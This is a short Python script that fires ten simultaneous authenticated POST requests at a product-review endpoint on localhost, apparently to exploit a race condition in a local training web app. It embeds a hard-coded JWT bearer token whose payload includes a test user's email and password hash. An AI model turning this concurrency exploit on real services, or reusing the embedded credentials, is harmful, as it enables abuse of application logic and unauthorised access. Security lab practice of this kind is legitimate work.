import threading
import requests

url = "http://localhost:3000/rest/products/reviews"
headers = {
    "Content-Type": "application/json",
    "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0MTIzQHRlc3QuY29tIiwicGFzc3dvcmQiOiJjYzAzZTc0N2E2YWZiYmNiZjhiZTc2NjhhY2ZlYmVlNSIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNC0xNCAxMjo1MTo1NS44NDAgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNC0xNCAxNjozODowMi4xOTIgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzc2MjQ3OTE2fQ.ZnzfXhfvsqeIKfnovbLzyv3PXfFR82eFAORghyqKrcJWKhIwc5HPvNMMZMngd88AZaTOiAqR4s6j5vC4GVWFDQbJGChcl3KSRl5BnOQ7BxEopMRYRcYATxS4cmsJo7X_ZaHOcSvkFIZZVaSNRX4PcwqZ5mp6UAnlYa3ZIPGaqeo"
}
body = {"id": "Y9aYTDsZp9AMkwjJL"}

def send_request():
    r = requests.post(url, json=body, headers=headers)
    print(r.text)

threads = []
for i in range(10):
    t = threading.Thread(target=send_request)
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()
